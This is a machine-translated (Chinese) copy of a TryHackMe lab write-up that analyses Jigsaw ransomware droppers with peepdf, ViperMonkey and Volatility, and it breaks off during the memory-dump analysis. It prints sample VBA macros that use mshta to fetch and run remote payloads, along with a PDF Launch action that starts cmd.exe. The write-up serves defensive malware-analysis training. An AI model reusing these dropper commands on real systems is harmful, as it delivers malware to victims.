<html>
<head>
<title>TryHackMe writeup: A cursory analysis of the Jigsaw ransomware</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:对Jigsaw勒索软件的粗略分析</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-a-cursory-analysis-of-the-jigsaw-ransomware-ee949b444f3f?source=collection_archive---------2-----------------------#2022-11-30">https://infosecwriteups.com/tryhackme-writeup-a-cursory-analysis-of-the-jigsaw-ransomware-ee949b444f3f?source=collection_archive---------2-----------------------#2022-11-30</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="cf7b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi kp translated">安索姆软件造成了数百万美元的损失和极度的悲痛，让计算机世界陷入了疯狂。这当然是信息安全部门应该解决的问题。我打算通过讨论我在TryHackMe room的方向上分析一个名为<em class="ky"> Jigsaw </em>的勒索软件的经历来为这个领域做出贡献。</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div role="button" tabindex="0" class="lf lg di lh bf li"><div class="gi gj kz"><img src="../Images/bc3ebcb21949ca9d8b768e1929889205.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wUdCGsUSyvshMxVUzxtY3A.png"/></div></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">部分影像成分来自:<a class="ae lp" href="https://youtu.be/WXBHCQYxwr0" rel="noopener ugc nofollow" target="_blank">《艾娃麦克斯》(2018)</a><a class="ae lp" href="https://tryhackme.com/room/malremnuxv2" rel="noopener ugc nofollow" target="_blank">《cmnatic》(2020)</a>。</figcaption></figure><h1 id="efa3" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">目录一览</h1><ol class=""><li id="6cfa" class="mo mp iu jt b ju mq jy mr kc ms kg mt kk mu ko mv mw mx my bi translated">背景</li><li id="627d" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">程序</li><li id="2a7b" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">讨论</li><li id="fd84" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">结论</li><li id="1e4b" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">参考</li></ol><h1 id="0d1f" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">背景</h1><p id="53c2" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将把勒索软件定义为“<em class="ky">一种恶意软件，它要么锁定你的电脑屏幕，要么加密你的文件[并且你会被告知]你必须支付赎金才能重新获得对你的电脑和/或文件的访问，并提供如何操作的说明</em>。(<a class="ae lp" href="https://www.usenix.org/conference/soups2019/presentation/simoiu" rel="noopener ugc nofollow" target="_blank">思茅等人2019 </a>)。勒索软件对“真实世界”经济(<a class="ae lp" href="https://doi.org/10.48550/arXiv.1703.06660" rel="noopener ugc nofollow" target="_blank">Hernandez-Castro et al . 2017</a>)甚至加密货币经济学(<a class="ae lp" href="https://doi.org/10.1016/j.cose.2018.08.008" rel="noopener ugc nofollow" target="_blank"> Conti et al. 2018 </a>)造成了重大影响；<a class="ae lp" href="https://doi.org/10.1007/s41125-019-00039-8" rel="noopener ugc nofollow" target="_blank">Zimba&amp;Chishimba 2019</a>)。显然，这是一个需要由信息安全专业人员来解决的问题。</p><p id="cfc1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">勒索软件可以通过计算机恶意软件分析的方法来解决。本房间(<a class="ae lp" href="https://tryhackme.com/room/malremnuxv2" rel="noopener ugc nofollow" target="_blank"> "cmnatic" 2020 </a>)介绍了一些数字取证和恶意软件分析工具，并通过分析一种名为<em class="ky"> Jigsaw </em>的勒索病毒株来展示它们的特性——这是2016年至2017年的一种突出的勒索病毒株(参见<a class="ae lp" href="https://www.proquest.com/openview/afcfc630d5877520a0734e706402d403/" rel="noopener ugc nofollow" target="_blank">Byrne&amp;Thorpe 2017</a>；<a class="ae lp" href="https://doi.org/10.1049/iet-net.2017.0207" rel="noopener ugc nofollow" target="_blank">奥凯恩等人2018</a>；<a class="ae lp" href="https://www.bleepingcomputer.com/news/security/jigsaw-ransomware-decrypted-will-delete-your-files-until-you-pay-the-ransom/" rel="noopener ugc nofollow" target="_blank">艾布拉姆斯2016 </a>。本文结合我的经验对Jigsaw勒索软件做了初步的分析。</p><h1 id="bd89" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">程序</h1><p id="c773" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">关于Jigsaw勒索软件的分析的以下目标如下:分析关于Jigsaw勒索软件的PDF文件、Microsoft Office宏和可执行文件，识别混淆代码并进行去混淆和分析，以及分析感染了Jigsaw勒索软件的计算机系统的转储物理存储器。(转述自<a class="ae lp" href="https://tryhackme.com/room/malremnuxv2" rel="noopener ugc nofollow" target="_blank">《cmnantic》2020</a>)。</p><p id="c82c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将通过SSH服务连接到一台<em class="ky"> TryHackMe </em>机器，并使用命令行工具来分析关于受感染计算机系统的取证工件。我修改了我的AttackerBox <code class="fe nh ni nj nk b">/etc/hosts</code>文件，使其包含一个不断变化的要连接的机器的动态IP地址的条目，单击该房间第二个任务右上角的绿色“start[m]machine”按钮，开始连接机器并开始分析。</p><h2 id="03a2" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">PDF滴管的粗略分析</h2><p id="d00c" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将从分析<code class="fe nh ni nj nk b">advert.pdf</code>开始，这是一个法医PDF工件。我使用了<code class="fe nh ni nj nk b">peepdf</code>工具来完成这项任务。<strong class="jt iv"/><code class="fe nh ni nj nk b">peepdf</code>(<a class="ae lp" href="https://github.com/jesparza/peepdf" rel="noopener ugc nofollow" target="_blank">Esparza n . d .</a>)是用于分析PDF取证工件的命令行工具。我用它分析了一个名为<code class="fe nh ni nj nk b">notsuspicious.pdf</code>的法医PDF工件，并转储了关于它的基本信息:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="6031" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ peepdf notsuspicious.pdf</strong><br/>Warning: PyV8 is not installed!!<br/><br/>File: notsuspicious.pdf<br/>MD5: 2992490eb3c13d8006e8e17315a9190e<br/>SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee<br/>SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a<br/>Size: 28891 bytes<br/>Version: 1.7<br/>Binary: True<br/>Linearized: False<br/>Encrypted: False<br/>Updates: 0<br/>Objects: 18<br/>Streams: 3<br/>URIs: 0<br/>Comments: 0<br/>Errors: 0<br/>Version 0:<br/>        Catalog: 1<br/>        Info: 7<br/>        Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]<br/>        Streams (3): [4, 15, 18]<br/>                Encoded (2): [15, 18]<br/>        Objects with JS code (1): [6]<br/>        Suspicious elements:<br/>                /OpenAction (1): [1]<br/>                /JS (1): [6]<br/>                /JavaScript (1): [6]</span></pre><p id="2312" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">输出报告文件的基本信息，如文件名、大小(以字节为单位)、加密校验和、对象数量、加密状态等。它还报告了PDF文档中可疑元素的数量——例如<em class="ky"> JavaScript </em>和<em class="ky">打开操作</em>的数量(请参见<a class="ae lp" href="https://helpx.adobe.com/acrobat/using/applying-actions-scripts-pdfs.html" rel="noopener ugc nofollow" target="_blank"> Adobe c.a. 2022 </a>了解更多信息)。</p><p id="7c56" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">为了调查可疑的JavaScript，我指示<code class="fe nh ni nj nk b">peepdf</code>提取<code class="fe nh ni nj nk b">notsuspicious.pdf</code>文件中的JavaScript，然后使用<code class="fe nh ni nj nk b">cat</code>转储其内容:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="dccf" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ peepdf -C "extract js &gt; notsuspicious.js" notsuspicious.pdf</strong><br/><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ cat notsuspicious.js</strong><br/>// peepdf comment: Javascript code located in object 6 (version 0)<br/><br/>app.alert("THM{redacted}");<strong class="nk iv">remnux@thm-remnux:~/Tasks/3$</strong></span></pre><p id="88cf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这只是一个标志，以满足完成房间的先决条件。然后，我继续转储关于<code class="fe nh ni nj nk b">advert.pdf</code>的基本信息，这是分配给用户的另一个法医PDF工件:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="2a01" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ peepdf advert.pdf</strong><br/>Warning: PyV8 is not installed!!<br/><br/>File: advert.pdf<br/>MD5: 1b79db939b1a77a2f14030f9fd165645<br/>SHA1: e760b618943fe8399ac1af032621b6e7b327a772<br/>SHA256: 09bb03e57d14961e522446e1e81184ca0b4e4278f080979d80ef20dacbbe50b7<br/>Size: 74870 bytes<br/>Version: 1.7<br/>Binary: True<br/>Linearized: False<br/>Encrypted: False<br/>Updates: 2<br/>Objects: 29<br/>Streams: 6<br/>URIs: 0<br/>Comments: 0<br/>Errors: 1<br/><br/>Version 0:<br/>        Catalog: 1<br/>        Info: 9<br/>        Objects (22): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]<br/>        Compressed objects (7): [10, 11, 12, 13, 14, 15, 16]<br/>        Streams (5): [4, 17, 19, 20, 22]<br/>                Xref streams (1): [22]<br/>                Object streams (1): [17]<br/>                Encoded (4): [4, 17, 19, 22]<br/>        Suspicious elements:<br/>                /Names (1): [13]<br/><br/>Version 1:<br/>        Catalog: 1<br/>        Info: 9<br/>        Objects (0): []<br/>        Streams (0): []<br/><br/>Version 2:<br/>        Catalog: 1<br/>        Info: 9<br/>        Objects (7): [1, 3, 24, 25, 26, 27, 28]<br/>        Streams (1): [26]<br/>                Encoded (1): [26]<br/>        Objects with JS code (1): [27]<br/>        Suspicious elements:<br/>                /OpenAction (1): [1]<br/>                /Names (2): [24, 1]<br/>                /AA (1): [3]<br/>                /JS (1): [27]<br/>                /Launch (1): [28]<br/>                /JavaScript (1): [27]</span></pre><p id="eeec" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">advert.pdf</code>有六(6)种不同类别的可疑元素。接下来，我在这个PDF文档中转储了JavaScript和任何潜在的统一资源标识符(参见<a class="ae lp" href="https://www.rfc-editor.org/rfc/rfc3986" rel="noopener ugc nofollow" target="_blank"> Berners-Lee 2005 </a>):</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="7b5f" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ peepdf -C "extract js &gt; advert.js" advert.pdf<br/>remnux@thm-remnux:~/Tasks/3$ cat advert.js</strong><br/>// peepdf comment: Javascript code located in object 27 (version 2)<br/><br/>this.exportDataObject({<br/>    cName: "notsuspicious",<br/>    nLaunch: 0<br/>});<strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ peepdf -C "extract uri &gt; advert.uri.txt" advert.pdf<br/>remnux@thm-remnux:~/Tasks/3$ cat advert.uri.txt<br/>remnux@thm-remnux:~/Tasks/3$</strong></span></pre><p id="0765" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">似乎可能有一些可执行代码和动态脚本与这个PDF文件和<code class="fe nh ni nj nk b">notsuspicious.pdf</code>相关联，所以我将使用<code class="fe nh ni nj nk b">strings</code>实用程序(<a class="ae lp" href="https://linux.die.net/man/1/strings" rel="noopener ugc nofollow" target="_blank"> Linux手册页n.d. </a>)转储这两个PDF文档的字符串:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="5fa4" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ strings advert.pdf</strong><br/>%PDF-1.7<br/>1 0 obj<br/>&lt;&lt;/Type/Catalog/Pages 2 0 R/Lang(en-GB) /StructTreeRoot 10 0 R/MarkInfo&lt;&lt;/Marked true&gt;&gt;/Metadata 20 0 R/ViewerPreferences 21 0 R&gt;&gt;<br/>endobj<br/>2 0 obj<br/><br/>[... snip ...]<br/><br/>#5/PT3<br/>eR~j<br/>endstream<br/>endobj<br/>27 0 obj<br/>&lt;&lt;/S/JavaScript/JS(this.exportDataObject({ cName: "notsuspicious", nLaunch: 0 });)/Type/Action&gt;&gt;<br/>endobj<br/>28 0 obj<br/>&lt;&lt;/S/Launch/Type/Action/Win&lt;&lt;/F(cmd.exe)/D(c:\\windows\\system32)/P(/Q /C %HOMEDRIVE%&amp;cd %HOMEPATH%&amp;(if exist "Desktop\\notsuspicious.pdf" (cd "Desktop"))&amp;(if exist "My Documents\\notsuspicious.pdf" (cd "My Documents"))&amp;(if exist "Documents\\notsuspicious.pdf" (cd "Documents"))&amp;(if exist "Escritorio\\notsuspicious.pdf" (cd "Escritorio"))&amp;(if exist "Mis Documentos\\notsuspicious.pdf" (cd "Mis Documentos"))&amp;(start notsuspicious.pdf)<br/>To view the encrypted content please tick the "Do not show this message again" box and press Open.)&gt;&gt;&gt;&gt;<br/>endobj<br/>1 0 obj<br/>&lt;&lt;/Type/Catalog/Pages 2 0 R/Names 23 0 R/OpenAction 27 0 R/Lang(en-GB) /StructTreeRoot 10 0 R/MarkInfo&lt;&lt;/Marked true&gt;&gt;/Metadata 20 0 R/ViewerPreferences 21 0 R&gt;&gt;<br/>endobj<br/>3 0 obj<br/>&lt;&lt;/Type/Page/Parent 2 0 R/Resources&lt;&lt;/Font&lt;&lt;/F1 5 0 R&gt;&gt;/ExtGState&lt;&lt;/GS7 7 0 R/GS8 8 0 R&gt;&gt;/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] &gt;&gt;/MediaBox[ 0 0 595.32 841.92] /Contents 4 0 R/Group&lt;&lt;/Type/Group/S/Transparency/CS/DeviceRGB&gt;&gt;/Tabs/S/StructParents 0/AA&lt;&lt;/O 28 0 R&gt;&gt;&gt;&gt;<br/><br/>[... snip ...]<br/><br/><strong class="nk iv">remnux@thm-remnux:~/Tasks/3$ strings notsuspicious.pdf</strong><br/>%PDF-1.7<br/>1 0 obj<br/>/Type /Catalog<br/>/Pages 2 0 R<br/>/Lang (en-GB)<br/>/StructTreeRoot 3 0 R<br/>/MarkInfo &lt;&lt;<br/>/Marked true<br/>/Metadata 4 0 R<br/>/ViewerPreferences 5 0 R<br/>/OpenAction 6 0 R<br/>endobj<br/>7 0 obj<br/>/Author (Ben)<br/>/Creator &lt;FEFF004D006900630072006F0073006F0066007400AE00200057006F0072006400200066006F00720020004D006900630072006F0073006F006600740020003300360035&gt;<br/>/CreationDate (D:20201020182347+01'00')<br/>/ModDate (D:20201020182347+01'00')<br/>/Producer &lt;FEFF004D006900630072006F0073006F0066007400AE00200057006F0072006400200066006F00720020004D006900630072006F0073006F006600740020003300360035&gt;<br/>endobj<br/><br/>[... snip ...]</span></pre><p id="af17" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我试图从这些信息中得到一些关于PDF文档行为的线索。从<code class="fe nh ni nj nk b">advert.pdf</code>文件的字符串来看，似乎有启动<code class="fe nh ni nj nk b">cmd.exe</code>并依赖于<code class="fe nh ni nj nk b">notsuspicious.pdf</code>的可执行代码。然后我转储了<code class="fe nh ni nj nk b">notsuspicious.pdf</code>的字符串，它似乎没有任何有用的信息。</p><p id="f3f9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">稍后我将详细阐述这些发现，现在开始对<em class="ky"> Microsoft Word </em>(参见<a class="ae lp" href="https://www.microsoft.com/en-us/microsoft-365/microsoft-office" rel="noopener ugc nofollow" target="_blank"> Microsoft n.d. </a>)宏进行粗略分析。</p><h2 id="8911" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">Word宏滴管浅析</h2><p id="c2f8" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将继续分析被怀疑含有滴管的<em class="ky">微软Word </em>文档。我使用了<em class="ky"> ViperMonkey </em>工具包(<a class="ae lp" href="https://github.com/decalage2/ViperMonkey" rel="noopener ugc nofollow" target="_blank"> Lagadec n.d. </a>)来分析来自所述可疑Word文档的Visual Basic宏——从名为<code class="fe nh ni nj nk b">DefinitelyALegitInvoice.doc</code>的取证工件开始</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="65db" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/4$ vmonkey DefinitelyALegitInvoice.doc</strong><br/> _    ___                 __  ___            __             <br/>| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __<br/>| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /<br/>| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,&lt; /  __/ /_/ / <br/>|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  <br/>     /_/                                           /____/   <br/>vmonkey 0.08 - https://github.com/decalage2/ViperMonkey<br/>THIS IS WORK IN PROGRESS - Check updates regularly!<br/>Please report any issue at https://github.com/decalage2/ViperMonkey/issues<br/><br/>===============================================================================<br/>FILE: DefinitelyALegitInvoice.doc<br/>INFO     Starting emulation...<br/>INFO     Emulating an Office (VBA) file.<br/>INFO     Reading document metadata...<br/><br/>[... snip ...]</span></pre><p id="b84f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">出于可读性的目的，我将编辑原始输出，但将描述它的输出。下表总结了由<code class="fe nh ni nj nk b">vmonkey</code>完成的分析:</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div class="gi gj og"><img src="../Images/454cfa103f6ef8f22e13f44edace48d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*GkXmu38XKEpvJlFDSSQ2Uw.png"/></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">表1:<code class="fe nh ni nj nk b">DefinitelyALegitInvoice.doc</code>宏行为总结。</figcaption></figure><p id="342a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">vmonkey</code>标识了一个名为<code class="fe nh ni nj nk b">DefoLegit</code>的函数，并显示它通过<code class="fe nh ni nj nk b">cmd.exe</code>执行一个命令，以从远程位置执行一个<em class="ky"> HTML应用</em>(参见<a class="ae lp" href="https://patents.google.com/patent/US6662341B1/en" rel="noopener ugc nofollow" target="_blank"> Cooper et al. 2003 </a>)有效载荷。以下是该函数的代码:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="e751" class="ob lr iu nk b be oc od l oh of">' VBA CODE (with long lines collapsed):<br/>Private Sub DefoLegit()<br/>    Shell ("cmd /c mshta http://10.0.0.10:4444/MyDropper.exe")<br/>End Sub</span></pre><p id="7712" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">DefoLegit</code>通过<code class="fe nh ni nj nk b">Shell</code>命令从<em class="ky"> HTML应用程序</em>获取可执行的滴管。<code class="fe nh ni nj nk b">vmonkey</code>还输出了以下内容作为妥协的候选指标:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="0d2d" class="ob lr iu nk b be oc od l oh of">INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'<br/>INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'<br/>INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'<br/>INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'<br/>INFO     Found possible intermediate IOC (URL): 'http://10.0.0.10:4444/MyDropper.exe'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'</span></pre><p id="2bf0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这一切都很有趣。我现在将重复我用来分析<code class="fe nh ni nj nk b">DefinitelyALegitInvoice.doc</code>的过程，来分析另一个名为<code class="fe nh ni nj nk b">Taxes2020.doc</code>的Word文档</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="3118" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/4$ vmonkey Taxes2020.doc</strong><br/> _    ___                 __  ___            __             <br/>| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __<br/>| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /<br/>| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,&lt; /  __/ /_/ / <br/>|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  <br/>     /_/                                           /____/   <br/>vmonkey 0.08 - https://github.com/decalage2/ViperMonkey<br/>THIS IS WORK IN PROGRESS - Check updates regularly!<br/>Please report any issue at https://github.com/decalage2/ViperMonkey/issues<br/><br/>===============================================================================<br/>FILE: Taxes2020.doc<br/>INFO     Starting emulation...<br/>INFO     Emulating an Office (VBA) file.<br/>INFO     Reading document metadata...<br/><br/>[... snip ...]</span></pre><p id="d676" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">正如我对<code class="fe nh ni nj nk b">DefinitelyALegitInvoice.doc</code>的分析一样，为了简洁起见，我将编辑<code class="fe nh ni nj nk b">Taxes2020.doc</code>的大部分输出。下表是由<code class="fe nh ni nj nk b">vmonkey</code>生成的宏及其各自行为的总结:</p><figure class="la lb lc ld gu le gi gj paragraph-image"><div class="gi gj oi"><img src="../Images/2c83d7bdee639948609aecc8c8234fd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/1*WF9MJdzhdNwu5BbgGin8Uw.png"/></div><figcaption class="ll lm gk gi gj ln lo bd b be z dk translated">表2:<code class="fe nh ni nj nk b">Taxes2020.doc</code>宏行为总结。</figcaption></figure><p id="61c6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">以下是<code class="fe nh ni nj nk b">Taxes2020.doc</code>有效载荷的源代码:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="aa13" class="ob lr iu nk b be oc od l oh of">' VBA CODE (with long lines collapsed):<br/>Private Sub X544FE()<br/>    Shell ("cmd /c mshta http://tryhackme.com/notac2cserver.sh")<br/>End Sub</span></pre><p id="91e9" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">vmonkey</code>还生成了以下内容作为<code class="fe nh ni nj nk b">Taxes2020.doc</code>的潜在危害指标:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="eca1" class="ob lr iu nk b be oc od l oh of">INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/sType/ResourceEvent'<br/>INFO     Found possible intermediate IOC (URL): 'http://www.w3.org/1999/02/22-rdf-syntax-ns'<br/>INFO     Found possible intermediate IOC (URL): 'http://purl.org/dc/elements/1.1/'<br/>INFO     Found possible intermediate IOC (URL): 'http://schemas.openxmlformats.org/drawingml/2006/main'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/mm/'<br/>INFO     Found possible intermediate IOC (URL): 'http://tryhackme.com/notac2cserver.sh'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/photoshop/1.0/'<br/>INFO     Found possible intermediate IOC (URL): 'http://ns.adobe.com/xap/1.0/'</span></pre><p id="eac3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于<code class="fe nh ni nj nk b">Taxes2020.doc</code>，它遵循相同的基本逻辑，通过<code class="fe nh ni nj nk b">Shell</code>命令和<code class="fe nh ni nj nk b">cmd.exe</code>执行HTML应用有效载荷。</p><p id="57e1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">随着滴管分析的结束，我觉得我现在有足够的上下文来分析被Jigsaw勒索软件感染的计算机系统的物理内存转储。</p><h2 id="5869" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">物理内存转储的粗略分析</h2><p id="86e2" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我使用<em class="ky"> Volatility Framework </em>(参见<a class="ae lp" href="https://www.volatilityfoundation.org/about" rel="noopener ugc nofollow" target="_blank">Volatility Foundation n . d .</a>)来分析感染了Jigsaw勒索软件的计算机系统的物理内存转储。我首先指示<code class="fe nh ni nj nk b">volatility</code>从内存转储中找出Microsoft Windows的哪个主要版本以及哪个服务包正在被感染的系统上运行:</p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="ac39" class="ob lr iu nk b be oc od l oe of"><strong class="nk iv">remnux@thm-remnux:~/Tasks/6$ volatility -f Win7-Jigsaw.raw imageinfo</strong><br/>Volatility Foundation Volatility Framework 2.6.1<br/>/usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.<br/>  from cryptography.hazmat.backends.openssl import backend<br/>INFO    : volatility.debug    : Determining profile based on KDBG search...<br/>          <strong class="nk iv"><em class="ky">Suggested Profile(s) : Win7SP1x64, Win7SP0x64</em></strong>, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418<br/>                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)<br/>                     AS Layer2 : FileAddressSpace (/home/remnux/Tasks/6/Win7-Jigsaw.raw)<br/>                      PAE type : No PAE<br/>                           DTB : 0x187000L<br/>                          KDBG : 0xf6fc00016130L<br/>          Number of Processors : 2<br/>     Image Type (Service Pack) : 1<br/>                KPCR for CPU 0 : 0xfffff80002c02000L<br/>                KPCR for CPU 1 : 0xfffff88002f00000L<br/>             KUSER_SHARED_DATA : 0xfffff78000000000L<br/>           Image date and time : 2020-10-20 17:21:03 UTC+0000<br/>     Image local date and time : 2020-10-20 18:21:03 +0100<br/><strong class="nk iv">remnux@thm-remnux:~/Tasks/6$</strong></span></pre><p id="7807" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从<code class="fe nh ni nj nk b">volatility</code>的输出中，我可以推断出<em class="ky">带有服务包<em class="ky">的微软Windows 7 </em>(参见<a class="ae lp" href="https://support.microsoft.com/en-us/windows/install-windows-7-service-pack-1-sp1-b3da2c0f-cdb6-0572-8596-bab972897f61" rel="noopener ugc nofollow" target="_blank">微软n.d.-b </a>)正在被感染的系统上运行，并且被感染的系统使用的是x86_64指令集(参见<a class="ae lp" href="https://devblogs.microsoft.com/oldnewthing/20220831-00/?p=107077" rel="noopener ugc nofollow" target="_blank">陈2022 </a>)。现在我知道了运行的是哪个版本的Windows，我可以定制<code class="fe nh ni nj nk b">volatility</code>来对适当的概要文件进行分析。我首先转储了受感染系统上正在运行的进程:</em></p><pre class="la lb lc ld gu nx nk ny bn nz oa bi"><span id="c2ad" class="ob lr iu nk b be oc od l oe of"><strong class="nk 